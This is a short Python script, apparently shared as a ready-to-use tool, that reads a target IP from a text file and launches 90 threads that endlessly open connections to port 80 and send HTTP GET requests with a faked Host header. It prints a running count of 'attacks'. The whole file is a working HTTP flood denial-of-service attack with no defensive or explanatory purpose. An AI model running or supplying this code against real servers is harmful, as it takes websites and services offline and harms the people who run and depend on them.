import socket
import threading

# Membaca target IP dari file konfigurasi
def read_target_from_file():
    with open("target.txt", "r") as file:
        for line in file:
            if line.startswith("target_ip="):
                return line.split("=")[1].strip()
    return "default_target_ip"  # Return default if no target found

target = read_target_from_file()
fake_ip = "138.201.247.85"  # Use a valid fake IP
port = 80

# Global variable to count the number of attacks
attack_num = 0

# Attack function
def attack():
    global attack_num
    while True:
        try:
            # Create a new socket
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((target, port))

            # Send HTTP GET request
            request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
            soc.send(request.encode("ascii"))

            # Increment the attack counter
            attack_num += 1
            print(f"\033[92mScript By Hamzss, Succes Attack On {target}: {attack_num}\033[0m")

            # Close the socket
            soc.close()
        except Exception as e:
            print(f"Error occurred: {e}")
            continue

# Create and start threads
for i in range(90):
    thread = threading.Thread(target=attack)
    thread.start()
